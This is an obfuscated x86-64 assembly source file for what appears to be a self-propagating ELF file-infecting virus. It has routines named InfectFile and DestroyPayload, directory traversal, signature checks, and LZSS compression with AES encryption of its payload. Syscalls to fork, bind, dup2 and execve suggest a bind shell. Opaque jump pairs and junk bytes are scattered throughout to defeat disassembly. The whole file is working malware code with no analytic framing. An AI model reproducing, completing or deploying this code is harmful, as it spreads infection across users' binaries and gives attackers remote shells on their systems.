..@sSPxQXbaUYrY:
    xchg        rsi, rsi
    jmp         ..@n3sxgTnSsMHG
..@scwCbUJEGGLF:
    mov         BYTE [r1], '/'
    jl          ..@x5sknQWuD8Uv
    jge         ..@x5sknQWuD8Uv
..@LtXUxGlFh10Q:
    movdqu      xmm1, oWORD [rsp+0xd0]
    jmp         $+4
db 0x8b, 0x72
    jmp         $+5
db 0xe4, 0xa9, 0x07
    jmp         $+3
db 0x66
    jmp         ..@KVMOVDO84E5z
..@aXBuhoikYsmO:
    push        rsi
    jmp         ..@0WMTYRTS0pti
..@k4dcvMyrFtgw:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jl          ..@XeGoQthwV6F2
    jge         ..@XeGoQthwV6F2
..@CS5H27vmkaM2:
    mov         rcx, rcx
    js          ..@dGxZWbOYFJ6J
    jns         ..@dGxZWbOYFJ6J
..@47TBPhpWIozm:
    push        rax
    jmp         $+5
db 0x6b, 0x5a, 0xe8
    jmp         $+5
db 0xd4, 0x1a, 0x81
    jmp         $+3
db 0x9a
    jmp         ..@NVPIYw64Bv8S
..@jbxiexDquA4f:
    shl         edi, 0x8
    jmp         $+5
db 0x5e, 0x80, 0x92
    jmp         $+3
db 0xb9
    js          ..@DztoZifIKcyw
    jns         ..@DztoZifIKcyw
..@ZwquDfuqwqAK:
    pop         rcx
    jl          ..@SdWDlyTyjNkO
    jge         ..@SdWDlyTyjNkO
NonBinaryFile:
    jmp         ..@q78QIdNA89NR
..@P1hMY8ejuA2Y:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    jl          ..@Al0nTLhpBTyN
    jge         ..@Al0nTLhpBTyN
..@lshrYP0w4cLp:
    mov         QWORD [rsp+_AESE_OFF.startaddr], r1
    jmp         $+3
db 0x12
    jmp         ..@yYhUbPKSvqcC
..@oHY9uXdS0Rf1:
    and         r2, 0x00ffffff
    jmp         $+4
db 0x4a, 0x45
    jb          ..@zxLjZyzvO03n
    jae         ..@zxLjZyzvO03n
..@q4A98WAJKwUs:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jb          ..@aEYY7gCxjL6r
    jae         ..@aEYY7gCxjL6r
..@RYDVJaj1Vv4f:
    push        rdx
    jmp         ..@64ujVFgBPkmV
..@ifJJP5InOJiA:
    mov         ecx, signature_len
    jb          ..@FWWwHPMmhfxl
    jae         ..@FWWwHPMmhfxl
..@4DkVFCGeePIB:
    xor         rcx, rcx
    jmp         $+5
db 0x83, 0x00, 0x0e
    jmp         ..@KE9aHYv1LER6
..@x1FD9nOnmTtY:
    pop         rax
    jmp         $+3
db 0x2f
    jmp         $+5
db 0xa4, 0x80, 0x29
    jb          ..@yXUq5Nl0ykZs
    jae         ..@yXUq5Nl0ykZs
..@T2eAhZuqXagW:
    xor         r1, r1
    jb          ..@BJBRF87HNXgt
    jae         ..@BJBRF87HNXgt
..@2I7E3kbz7D1f:
    pop         rbx
    jmp         ..@DTHKmkkKHpY7
..@N6fmq7zrn975:
    push        rbx
    jl          ..@vYOqRNZBK4x1
    jge         ..@vYOqRNZBK4x1
..@gTC6wzrW312b:
    jl          ..@OS5T7Xuorw5n
    jmp         $+3
db 0xa4
    jmp         ..@LSeS5Kg6t3Bq
..@EsqWkfN1Tox3:
%ifdef X86_32
    xor         eax, eax
%endif
    js          ..@WpVCjlFwDme3
    jns         ..@WpVCjlFwDme3
..@YpEgDwZgFzcD:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    jmp         $+3
db 0xf7
    jmp         $+3
db 0xc2
    jl          ..@9XxRQQnx5qbu
    jge         ..@9XxRQQnx5qbu
..@PjVqEvqrlzSq:
    test        rax, rax
    jmp         $+3
db 0x45
    jmp         $+5
db 0x68, 0x10, 0x29
    jmp         ..@rhyL1qpgArUs
..@KTbdTsOfdS0T:
    mov         r1, QWORD [r5+file.fileptr]
    jb          ..@OyDN0ZaK09vT
    jae         ..@OyDN0ZaK09vT
..@pwTH18z844Ms:
    push        rax
    jmp         $+4
db 0xff, 0xb3
    jmp         $+5
db 0x74, 0xbc, 0xbf
    jmp         ..@NbPZQhCTTTrD
..@K33d7EFGvzJf:
    pop         rcx
    jmp         $+4
db 0x1b, 0x18
    jb          ..@1xQdxbsKAHET
    jae         ..@1xQdxbsKAHET
..@D0UB25mv6RmH:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         ..@0cSdexMeMgAq
..@gAnju1SJPqHq:
    mov         r1d, 0x2
    jmp         ..@jyyhzQZfYMPT
..@aWh9C6pdWdTl:
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    jmp         $+5
db 0x4b, 0x2b, 0xed
    jmp         $+3
db 0xcc
    jmp         ..@HxtPrY2G2CbG
..@OVKcryDDkcnu:
    mov         r1d, eax
    jmp         $+5
db 0x28, 0xd3, 0x08
    jmp         $+4
db 0xd9, 0x8f
    jmp         ..@SBaaPd14m3O3
..@oVIGsxIh9dkP:
    xchg        rsp, rsp
    jmp         $+4
db 0x43, 0xb8
    jmp         $+3
db 0x3d
    jmp         $+3
db 0x63
    jmp         $+5
db 0xb6, 0x00, 0x5c
    jmp         ..@kzR68a7x3NBv
..@qaejK6UkKodQ:
    jl          ..@4m6CD1hUe7FO
    jmp         $+3
db 0xbf
    je          ..@ZN2Dqddw4LhO
    jne         ..@ZN2Dqddw4LhO
..@f4h9DK8BctSI:
    mov         rbp, rbp
    jmp         $+4
db 0x00, 0x6c
    jmp         ..@CCfcntb545nO
..@yvxoge0KIldv:
    xchg        rcx, rcx
    jmp         $+3
db 0x0b
    jmp         $+3
db 0xab
    jmp         $+3
db 0x7c
    jb          ..@YcPLZAQvMn5V
    jae         ..@YcPLZAQvMn5V
..@7iuHRtFuslDL:
    push        rax
    jmp         $+4
db 0xca, 0x01
    jmp         ..@Klp8kQDo6gu4
..@vQuFdKhuwltj:
%ifdef X86_64
    mov         rdi, rdi
%endif
    jmp         $+4
db 0xa6, 0xa7
    jl          ..@z4uxkVwroyS5
    jge         ..@z4uxkVwroyS5
..@H1stYypOuNOO:
    pop         rax
    js          ..@M9SH5uamdSrs
    jns         ..@M9SH5uamdSrs
..@PhrE7rpcNERJ:
    add         r3, r5
    jb          ..@aXyb6CrOHRCh
    jae         ..@aXyb6CrOHRCh
..@nwIXcoolPMUl:
    pop         rax
    jmp         $+5
db 0x0c, 0x08, 0xa9
    jmp         $+4
db 0x74, 0x3b
    jl          ..@ih9MaOgBxSOK
    jge         ..@ih9MaOgBxSOK
..@9oQFZeOtzQaR:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jmp         $+4
db 0xa0, 0x29
    jmp         $+4
db 0xb6, 0xdd
    js          ..@J04klTFcn2aL
    jns         ..@J04klTFcn2aL
..@fa1NRL5kBu6h:
    mov         rbx, rbx
    jmp         $+3
db 0x33
    jb          ..@wIKdGEuOiqNf
    jae         ..@wIKdGEuOiqNf
..@RLOW2QsFLtdZ:
    xor         r2, r2
    jl          ..@AdlG6jdL3Rpd
    jge         ..@AdlG6jdL3Rpd
..@1toFXbeaajJu:
    push        rcx
    jmp         $+5
db 0x35, 0xa0, 0x21
    jl          ..@WiXMGsS3BUEu
    jge         ..@WiXMGsS3BUEu
..@XVl9me17mx3S:
    mov         rbx, rbx
    jmp         $+4
db 0x94, 0xd0
    jmp         ..@JzTEI2v40mdv
..@J04klTFcn2aL:
    mov         rsi, rsi
    jmp         $+3
db 0x19
    je          ..@XfC99HbG51Vc
    jne         ..@XfC99HbG51Vc
..@DTlXlgAGzMfR:
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    jmp         $+3
db 0x58
    jb          ..@vzpjBsv2rGJ0
    jae         ..@vzpjBsv2rGJ0
..@C4UGWOUD1xZC:
    pop         rdx
    je          ..@QvbzF4IM7sH2
    jne         ..@QvbzF4IM7sH2
..@631yqi0asW2H:
    push        rax
    jmp         $+3
db 0xcf
    jl          ..@2HQ8H56P4Hkw
    jge         ..@2HQ8H56P4Hkw
..@aVPGDb50KJLZ:
    push        rsi
    jmp         $+4
db 0x1f, 0x47
    jmp         $+5
db 0x7f, 0x81, 0x33
    jmp         ..@1P40QhihGOta
..@sLDeEWQhpVVV:
    xchg        rbx, rbx
    jmp         $+3
db 0x16
    js          ..@U547FsTXM2g6
    jns         ..@U547FsTXM2g6
LzssEncoder:
    jmp         ..@wgDDcpF7xWGH
..@kyTcakd1UKmO:
    mov         rsp, rsp
    jmp         $+4
db 0xd7, 0x64
    jmp         ..@qg5DlMM6ZZgF
..@tSVXZUqWzldd:
    push        rdx
    jmp         $+3
db 0x54
    jmp         ..@FETJcAj8ZiRh
..@dlPFOLJXTFet:
    mov         rdi, rdi
    jmp         ..@LhmVW6wJSWpP
..@iCx2muzH4kgO:
    xchg        rdx, rdx
    js          ..@Xj1Zi60w8Dff
    jns         ..@Xj1Zi60w8Dff
..@9jwWpuZmCJ7m:
    pop         rdi
    jmp         ..@vHAadjxreNts
..@NVPIYw64Bv8S:
    VAR         packed, dirs_root
    jmp         $+4
db 0x65, 0x58
    js          ..@a5GsuDcFj2WF
    jns         ..@a5GsuDcFj2WF
..@IeDeSkpiFFkd:
    mov         eax, SYS_DUP2
    jmp         ..@djPABNbuxaCn
..@Xq75FYxavo8Y:
    pop         rdi
    jmp         $+4
db 0x62, 0xb4
    jb          ..@oONzZfyftDT8
    jae         ..@oONzZfyftDT8
..@oGVipQ9OyebK:
    xchg        rsi, rsi
    jmp         $+4
db 0x14, 0xe6
    jmp         ..@MXhqUC9vPrfr
..@xH7qkNIZsl3W:
    jne         ..@vLasp30cQQ4e
    jmp         ..@PGFHY8mcQVTy
..@cX8OWYyIh509:
    xchg        rbx, rbx
    je          ..@2ei9p2z8YbmZ
    jne         ..@2ei9p2z8YbmZ
..@PuHks59ElWaK:
    xchg        rcx, rcx
    jmp         $+3
db 0x74
    jmp         ..@fRUBSK2sElgi
..@KCEAYMJ3g9Bj:
    sub         r1, 1
    jl          ..@5F5EbqNInIs2
    jge         ..@5F5EbqNInIs2
InfectFile:
    jmp         ..@PVyfnJ6LrkYg
..@3CZO96KSWsZF:
    push        rbx
    jmp         ..@FNhgHqJatVCN
..@NcUV0Jba6IoB:
    mov         rsi, rsi
    jmp         $+5
db 0x84, 0xf2, 0xa9
    jmp         $+3
db 0xe1
    jl          ..@0GjL3ynpuHmD
    jge         ..@0GjL3ynpuHmD
..@BxCG2eiDkSIM:
    xchg        rdi, rdi
    jb          ..@RzBDntFBGCUr
    jae         ..@RzBDntFBGCUr
..@jrFxwUXxzD7k:
    mov         rsi, m7
    js          ..@iYA2e25UVwxA
    jns         ..@iYA2e25UVwxA
..@yNdqNRHTPb8k:
    xor         r1, r1
    jmp         ..@RQcjHSgIwFPd
..@euJviYGDFsGY:
    mov         eax, SYS_EXECVE
    js          ..@OVbvfR3vh6hj
    jns         ..@OVbvfR3vh6hj
..@hIHJ14N4sz4E:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+4
db 0xcf, 0x39
    je          ..@0T2FWS7QNlaH
    jne         ..@0T2FWS7QNlaH
..@1aqJXUjaGUE5:
    xchg        rdx, rdx
    jmp         $+3
db 0x4d
    jmp         ..@yuPyXGLhXWq0
..@GJvDW2ZksPEb:
%ifdef X86_32
    mov         ecx, DWORD [edi+file.filesize]
%endif
    je          ..@3ZcWMZaqP526
    jne         ..@3ZcWMZaqP526
..@myG2fqSFlYsn:
    xchg        rcx, rcx
    jmp         $+3
db 0xb3
    jmp         $+3
db 0x33
    jb          ..@18XCsPH2mKwQ
    jae         ..@18XCsPH2mKwQ
..@jwMxP23s6Ra3:
    jmp         ..@zvMZAQzMoeRk
    jmp         $+3
db 0xc2
    je          ..@4FIVBMQ4t7E7
    jne         ..@4FIVBMQ4t7E7
..@ggkuQMOmOKm9:
    call        MemMove
    jmp         ..@ysUffXhCZ70b
..@lGjpmf11Ssv8:
    cmp         rax, 0xffffffffffffffff
    jmp         ..@5QQ28ZOQsluK
..@JWnDXEm9XQ9U:
    pop         rax
    jb          ..@Kj9iDOvqyJrc
    jae         ..@Kj9iDOvqyJrc
..@5LxU5qTnCAaD:
    mov         r3, r4
    jmp         $+4
db 0x7c, 0xf2
    je          ..@qLsUP6pnHVai
    jne         ..@qLsUP6pnHVai
..@2OTaKJbKgDqO:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    jmp         $+5
db 0x37, 0x47, 0x05
    js          ..@3aU9Sh4lEmAy
    jns         ..@3aU9Sh4lEmAy
..@VCLwwye1xAsY:
    rep         cmpsb
    jb          ..@cGNSurEi8cEI
    jae         ..@cGNSurEi8cEI
..@LhQ8RW44NVdc:
    add         r2, r1
    jb          ..@IJndamN12rlG
    jae         ..@IJndamN12rlG
..@sXq7hylwzkWN:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+4
db 0x9c, 0xa0
    jb          ..@DJr2WDv1w4RB
    jae         ..@DJr2WDv1w4RB
..@VMBepjvHx9NV:
    mov         rsi, rsi
    jmp         $+4
db 0xe0, 0x8d
    je          ..@1ON34x00aSZJ
    jne         ..@1ON34x00aSZJ
..@e2k0acQnjsfY:
    sub         rsi, 1
    jl          ..@WklSuw24mww2
    jge         ..@WklSuw24mww2
..@LmRaAsOh7F5R:
    xor         r2, r2
    jmp         $+5
db 0x20, 0x39, 0x3a
    js          ..@f84MHlTdUdBe
    jns         ..@f84MHlTdUdBe
..@7wWwkv0URVQ2:
    rep         nop
    jmp         $+3
db 0x7a
    jl          ..@fK2njN1pHVl1
    jge         ..@fK2njN1pHVl1
..@dDpmh3hVlu36:
    jne         ..@MAKHRHpNUaPj
    jmp         $+3
db 0x11
    jmp         ..@WSP0fw0T7bp1
..@0cywMreLtYGd:
    push        rdx
    je          ..@1AVp6vuNRqeC
    jne         ..@1AVp6vuNRqeC
DestroyPayload:
    jmp         ..@PAwTmg7Pw9Hi
..@eG3slVDJapLA:
    ret
    jmp         $+5
db 0xe3, 0xf8, 0x62
    jl          DestroyPayload
    jge         DestroyPayload
..@2fJ5zhmoKBFN:
    xor         rbx, rbx
    jmp         $+3
db 0x8a
    jl          ..@mmWVZODZiZz2
    jge         ..@mmWVZODZiZz2
..@qLPz0cCamMiQ:
    add         rsi, WINDOW_LENGTH
    jmp         $+4
db 0x07, 0x73
    jmp         ..@69cQLnmVxcxH
..@tgbGj8jCtFjG:
    mov         al, r2b
    jmp         ..@I1Yo5xWtltLo
..@nyqbvC7NYUb0:
    pop         rbx
    jmp         $+4
db 0xc3, 0x45
    jmp         $+3
db 0xbc
    je          ..@XVl9me17mx3S
    jne         ..@XVl9me17mx3S
..@Z0FqRIEs4RAB:
%ifdef X86_64
    mov         rsi, rsi
%endif
    jl          ..@WfyZUFcK3K0J
    jge         ..@WfyZUFcK3K0J
..@ih9MaOgBxSOK:
    add         rdi, _signature.key_preview-_signature.start+4
    jmp         $+5
db 0x78, 0x72, 0x3d
    jb          ..@TMkcMEe8Audk
    jae         ..@TMkcMEe8Audk
..@7kWxfrOPR2Uk:
    push        rdi
    jmp         $+4
db 0xb3, 0xb0
    jmp         ..@RS9dYxwyI5PK
..@YTazhBda7FH1:
    push        rbx
    jb          ..@RWKq6VTEt1oT
    jae         ..@RWKq6VTEt1oT
..@vO8whxcYFllX:
    push        rax
    js          ..@81MfwWTGicYL
    jns         ..@81MfwWTGicYL
..@1HQPY8Xod4is:
    xor         rax, rax
    jmp         ..@T2eAhZuqXagW
..@BsJoCKJIrS1a:
    and         r5, (PAGE_SIZE-1)
    jl          ..@UYPrwO5h0bEI
    jge         ..@UYPrwO5h0bEI
..@ZQ779PTxGfnP:
    pop         rdx
    jmp         $+4
db 0x0e, 0x3b
    jmp         $+3
db 0x40
    jmp         $+4
db 0x2a, 0xf8
    jmp         ..@517jMnRdpYN8
..@WfBs6Oz5X82V:
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         ..@ggoKC8zl7e6L
..@KE9aHYv1LER6:
    mov         rdi, m6
    jmp         $+4
db 0x4c, 0x74
    jl          ..@D8yuMlEOwyuB
    jge         ..@D8yuMlEOwyuB
..@rTCE6cME5Hy9:
    je          ..@R8nSqv1ZK9gw
    jmp         ..@wdLbtmQFMt5r
..@4iL6rcIY6vWc:
    call        Strcpy
    jmp         $+3
db 0xfe
    jmp         $+5
db 0xbd, 0x72, 0xaa
    jb          ..@4BC4qO43qW2l
    jae         ..@4BC4qO43qW2l
..@aQ8XslzevZ5O:
    cmp         BYTE [r1], 0x0
    jmp         ..@XqD04fCc4I7u
..@DmuofyFkohws:
    push        rcx
    jb          ..@ZwquDfuqwqAK
    jae         ..@ZwquDfuqwqAK
..@SPUNDlqeevNb:
    push        rdx
    jl          ..@blHtSZ80DA9Q
    jge         ..@blHtSZ80DA9Q
..@OCaGB2fXAZwr:
    je          ..@YWaFNXEL47vZ
    js          ..@vK4UcQMZedHh
    jns         ..@vK4UcQMZedHh
..@Hm11JZJw0n5S:
    xchg        rsi, rsi
    jb          ..@88JKtx0Jvh8P
    jae         ..@88JKtx0Jvh8P
..@QuipTfK0QVM7:
    xchg        rsp, rsp
    jmp         $+4
db 0x01, 0x64
    je          ..@PuHks59ElWaK
    jne         ..@PuHks59ElWaK
..@Q4wsvDfojBKs:
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    jmp         $+4
db 0xe9, 0x9a
    jl          ..@yuHEzTPRc2J0
    jge         ..@yuHEzTPRc2J0
..@EsbxTwnUdAAv:
    push        rdx
    jb          ..@zdap21efZ3z4
    jae         ..@zdap21efZ3z4
..@H6znhTZAMQTh:
    pop         rax
    jl          ..@7hI8BSPjhnDN
    jge         ..@7hI8BSPjhnDN
..@TEMMVKly6tqL:
    xchg        rcx, rcx
    jb          ..@pSG1Bhxlyzrb
    jae         ..@pSG1Bhxlyzrb
..@3KsZkADvrWYv:
    jmp         ..@kELIWW7luj3y
    jmp         $+4
db 0xe1, 0x55
    jmp         $+4
db 0xc0, 0x69
    jmp         $+5
db 0x80, 0xb4, 0x70
    jmp         ..@1LUgCcmn0aq0
..@lwl4Rm3L5TKQ:
    pop         rdx
    jl          ..@cfb5JeTStFai
    jge         ..@cfb5JeTStFai
..@nR2DVCK3v5eV:
    mov         rsp, rsp
    jmp         $+4
db 0xf3, 0xfb
    jl          ..@YXy02v28BkCW
    jge         ..@YXy02v28BkCW
..@mchcI4uwwIer:
    mov         r1, r4
    jb          ..@4gvZ6aFZXg26
    jae         ..@4gvZ6aFZXg26
..@hdNcVavMwMVZ:
    xchg        rsp, rsp
    jl          ..@HEeAqbgPEFTm
    jge         ..@HEeAqbgPEFTm
..@5HAMbR3agmIx:
    syscall
    jmp         $+5
db 0xf2, 0xf8, 0x27
    jmp         ..@t01oNKCUYPww
..@qw0aLEXxMuFI:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         ..@aB7edMPkXW6d
..@xWAjhYs05cke:
    add         rsp, _PAYLOAD_OFF_size
    jmp         $+5
db 0x40, 0x69, 0x0c
    jb          ..@eG3slVDJapLA
    jae         ..@eG3slVDJapLA
..@TMkcMEe8Audk:
    mov         DWORD [rdi], eax
    jmp         ..@jPW6lyrUf0oE
..@RQcjHSgIwFPd:
    xor         r2, r2
    js          ..@2YjK0flw3OkQ
    jns         ..@2YjK0flw3OkQ
..@9XXZoIPhJwHG:
    mov         rsi, rsi
    jmp         $+3
db 0xa6
    js          ..@Qlqu96jSrCy1
    jns         ..@Qlqu96jSrCy1
..@JbrdWMSi8grI:
    xor         r2, r2
    jmp         $+5
db 0x6e, 0x39, 0x31
    je          ..@Th8AKDKQowfH
    jne         ..@Th8AKDKQowfH
..@2ZR0B8AAfA6W:
    xor         rbx, rbx
    js          ..@zfNkm4UtJYWq
    jns         ..@zfNkm4UtJYWq
..@4zmZNkrCB2RH:
    xchg        rsi, rsi
    jmp         $+5
db 0xab, 0x39, 0x45
    js          ..@enTk2Srz3AYx
    jns         ..@enTk2Srz3AYx
..@ehhlBHEFgGYi:
    add         rsp, _INFDIR_OFF_size
    jl          ..@PBoCxaccHJLR
    jge         ..@PBoCxaccHJLR
..@8w0KTaUVWS2z:
    mov         eax, SYS_BIND
    jmp         $+5
db 0xe6, 0x32, 0xec
    jl          ..@iLYTdq3Lgy6i
    jge         ..@iLYTdq3Lgy6i
..@0BJomRNt4J82:
    jmp         ..@74DhweE13ffF
    jmp         $+4
db 0xb5, 0xb1
    jmp         $+4
db 0x85, 0x6d
    jb          ..@hLyO8mOXZsQX
    jae         ..@hLyO8mOXZsQX
..@GgvakrZEQikY:
    syscall
    jl          ..@Yg4VEKIucuL0
    jge         ..@Yg4VEKIucuL0
..@eLelSZ53vXl3:
    xchg        rax, rax
    jmp         $+3
db 0xdb
    jmp         $+5
db 0xb1, 0x6f, 0xd7
    jmp         ..@Hm9tHcewvGfN
..@1bHcuoBg3pH6:
    pop         rbx
    jmp         $+5
db 0x63, 0x6e, 0xd6
    jmp         $+5
db 0xb1, 0x7f, 0xb6
    je          ..@78Hw9XZfSzJJ
    jne         ..@78Hw9XZfSzJJ
..@pqYA7AjnUyVR:
    jz          ..@7N1lerTubqgK
    jmp         $+5
db 0x20, 0x2e, 0x20
    jb          ..@eHh2jTNSgIsh
    jae         ..@eHh2jTNSgIsh
..@G3yaOVoUpDNv:
    mov         rax, rax
    jmp         ..@sXq7hylwzkWN
..@GuYeHm6EuzG5:
    mov         rdx, rdx
    jl          ..@hzeXZMPO3Xmo
    jge         ..@hzeXZMPO3Xmo
..@tRjz8tUhwNIc:
    mov         rbx, rbx
    jmp         $+3
db 0x62
    js          ..@NEe7w2QpT8oc
    jns         ..@NEe7w2QpT8oc
..@HX316l9EULD7:
    inc         WORD m5
    jmp         $+5
db 0x11, 0xc2, 0xdf
    jmp         ..@i7NU1NGDZYnn
..@tGEUPkxab9Mk:
    push        rbx
    jmp         $+5
db 0x5d, 0xd8, 0xb1
    jmp         ..@UD0SkIGBm9Is
..@eHh2jTNSgIsh:
    add         r4, r3
    je          ..@GkPnjPOYEwiL
    jne         ..@GkPnjPOYEwiL
..@HGrhMmQZMKvc:
    mov         ecx, PADDING
    jmp         $+5
db 0x4b, 0x65, 0xf8
    jmp         $+3
db 0xad
    jl          ..@ULCPSYKNqE5B
    jge         ..@ULCPSYKNqE5B
..@0xyRWqwpjcFD:
    mov         rbp, rbp
    jmp         ..@ArsDwREa56cW
..@rLSBfvk7vcxW:
    aesenc      xmm0, xmm1
    jmp         $+5
db 0x9d, 0xac, 0xa1
    js          ..@Yeb6atPefDZA
    jns         ..@Yeb6atPefDZA
..@S5DQmikuQV6Z:
    xchg        rax, rax
    jl          ..@DCt5uVtTSj1y
    jge         ..@DCt5uVtTSj1y
..@ld1Uy6LnLWwU:
    xchg        rdx, rdx
    je          ..@9xIBYgzMsr2C
    jne         ..@9xIBYgzMsr2C
..@QIkvFuBdaMAO:
    mov         rbx, rbx
    jmp         ..@1eg6h15RbnUI
..@tUYJIw6d6kdf:
    push        r1
    jb          ..@WddXMgLF8tWR
    jae         ..@WddXMgLF8tWR
..@93fI968gTwk4:
    cmp         BYTE [r1], 0x00
    jl          ..@QHW3sSVuPfQ8
    jge         ..@QHW3sSVuPfQ8
..@6IlraetsIE21:
    xchg        rsp, rsp
    jmp         $+5
db 0xc1, 0xd1, 0x9e
    jmp         $+3
db 0x1d
    js          ..@xH7qkNIZsl3W
    jns         ..@xH7qkNIZsl3W
..@jIMZUdzMkWCw:
    xor         rdx, rdx
    js          ..@2qI4uywzjSTo
    jns         ..@2qI4uywzjSTo
..@iyr3zoFsbxtL:
    mov         r1, m6
    jmp         $+3
db 0x67
    js          ..@3dn3UcNVffLV
    jns         ..@3dn3UcNVffLV
..@EyzMpRE1utUr:
    push        rdx
    js          ..@HwCRuOnlP0LM
    jns         ..@HwCRuOnlP0LM
..@uLGD1b87C0cz:
    push        r5
    jmp         ..@C2x8zdhz0I1X
..@yUs9PRsTSMTu:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+4
db 0xb4, 0x8a
    jmp         ..@RAhpzuEFG2oe
..@3ZcWMZaqP526:
%ifdef X86_32
    mov         edx, 11b
%endif
    jmp         ..@qH013f3IyyTV
..@BPwz2Ni7fLeY:
    pop         rdx
    jmp         ..@78XXyJUUHAaB
..@aNL4Q7MOvRCw:
    VAR         packed, urandom
    jmp         $+3
db 0xc5
    js          ..@YnFe9Os95P8z
    jns         ..@YnFe9Os95P8z
..@qg5DlMM6ZZgF:
    add         r1, signature_len
    jmp         ..@1iQgI2I2yjcY
..@OBeTrbQBo4J2:
    push        rcx
    jmp         $+5
db 0x28, 0x4e, 0x28
    jmp         ..@6zrdGlR2scha
..@6beHUmiNCCEJ:
    rep         stosb
    jmp         ..@JbrdWMSi8grI
..@5lC2sAmyV25z:
    push        rax
    jmp         $+3
db 0xf1
    jmp         $+3
db 0xc0
    jmp         $+3
db 0xe4
    js          ..@wYMTki7xOSnz
    jns         ..@wYMTki7xOSnz
..@bglrDOeLRFAJ:
    mov         rsi, rsi
    jmp         ..@TZhRiXKnNGd9
..@Tex5JJa9dB6x:
    mov         rsp, rsp
    jmp         $+5
db 0xf1, 0x77, 0x08
    jmp         $+4
db 0x3b, 0xb8
    je          ..@R8nSqv1ZK9gw
    jne         ..@R8nSqv1ZK9gw
..@RYbNGaBP7p1o:
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    jmp         $+5
db 0xd4, 0x45, 0xe6
    jl          ..@ke8NEolEvMps
    jge         ..@ke8NEolEvMps
..@idYpkeEBLmDC:
    mov         rax, SYS_FORK
    jmp         $+4
db 0x32, 0x23
    jl          ..@PAVAxFja0pas
    jge         ..@PAVAxFja0pas
..@ImqGRMT9lDNL:
    movdqu      [rsi+rcx], xmm0
    jb          ..@tfJr2jLdayjF
    jae         ..@tfJr2jLdayjF
..@rpX7k3MiL27y:
    mov         rax, SYS_GETUID
    jl          ..@wm3sJ5XAv2Hd
    jge         ..@wm3sJ5XAv2Hd
..@NDMIYlojm2ff:
    je          ..@hgDoGSPPBir0
    jmp         $+4
db 0x59, 0x8b
    jmp         ..@7t64mwgINd1U
..@4tiiNd1Pi1tr:
    push        rbx
    jmp         ..@x5BG3Nt7Gboc
..@Wd4h5kIgllSE:
    mov         rsp, rsp
    js          ..@e7BWB3LQcYCB
    jns         ..@e7BWB3LQcYCB
..@P0GmZVp9QLTC:
    pop         rdi
    jmp         $+5
db 0xca, 0x58, 0xc6
    jmp         $+5
db 0xf6, 0x40, 0x2a
    jmp         ..@uqVudlaK2j6s
..@Vm8uFwcwDiRy:
    push        r2
    js          ..@cJ26ftzPQbRK
    jns         ..@cJ26ftzPQbRK
..@GDuSowwJl36h:
    push        rdi
    jmp         ..@xEDddp3vZQSu
..@qlv4Dq7B9mKC:
    xchg        rsp, rsp
    jmp         ..@SF6CBMWvtPCh
..@pJdxMI4s1j9b:
    jmp         ..@r84WpT3kWnJZ
    je          ..@jP88ddQO3XBM
    jne         ..@jP88ddQO3XBM
..@2PeVisk88uDu:
    pop         rbx
    jmp         $+3
db 0x23
    jb          ..@IXkRmKDwY0vW
    jae         ..@IXkRmKDwY0vW
..@HWvXid0BOsDx:
    mov         rcx, rcx
    js          ..@PWATGJdVqW0Y
    jns         ..@PWATGJdVqW0Y
..@LFCZiU4Bhccc:
    xchg        rdi, rdi
    jmp         $+4
db 0xff, 0xf8
    jmp         ..@kyTcakd1UKmO
..@5qc2L2OoF3Su:
    mov         rax, rax
    je          ..@wvdBtWTbIMeO
    jne         ..@wvdBtWTbIMeO
..@aB7edMPkXW6d:
    jne         ..@ykqgrewboLKF
    jmp         $+4
db 0xa3, 0x4c
    jl          ..@O8z2WoQMkOu3
    jge         ..@O8z2WoQMkOu3
..@ZcSOejOliDMy:
    mov         QWORD [r5+file.filesize], r3
    jmp         $+4
db 0x21, 0xd6
    jmp         $+5
db 0xee, 0x72, 0xda
    jb          ..@zn1rOgSa0s4N
    jae         ..@zn1rOgSa0s4N
..@1DTOdRXkM1a9:
    push        rcx
    jmp         ..@doy61jmcnjan
..@ae19FYJpRlQy:
    mov         r4, 0x1
    jb          ..@SPUNDlqeevNb
    jae         ..@SPUNDlqeevNb
..@tSNL5HPRkrMj:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jmp         $+5
db 0x49, 0x40, 0x97
    js          ..@JppMW4EfjyuH
    jns         ..@JppMW4EfjyuH
..@AbBWZPWr7Az0:
    mov         rdx, rdx
    js          ..@oxlDjPi3J5vK
    jns         ..@oxlDjPi3J5vK
..@YJklzLuKhqzC:
    pop         rcx
    jmp         ..@0zTuTEOOBQxg
..@BbaiNOFOevFL:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    je          ..@dbmEO2yQ90W2
    jne         ..@dbmEO2yQ90W2
..@rYK0qVYX7ZAm:
%ifdef X86_32
    push        ebp
%endif
    jmp         $+5
db 0x6b, 0x13, 0xfe
    jmp         ..@Z5y896HKEsuP
..@Sx8GoaNosU0Q:
    push        rax
    js          ..@l9NOT9BiIYDt
    jns         ..@l9NOT9BiIYDt
..@LcRAF2F5dbR0:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+5
db 0x3e, 0x81, 0xa6
    jmp         $+3
db 0x65
    jl          ..@LYPapSP9pzLW
    jge         ..@LYPapSP9pzLW
..@JpwO3y3EPIZB:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+4
db 0xb2, 0x50
    jmp         $+3
db 0x8c
    jl          ..@0JWI84NzcYIc
    jge         ..@0JWI84NzcYIc
..@t3RqAmJCBfDD:
    rep         nop
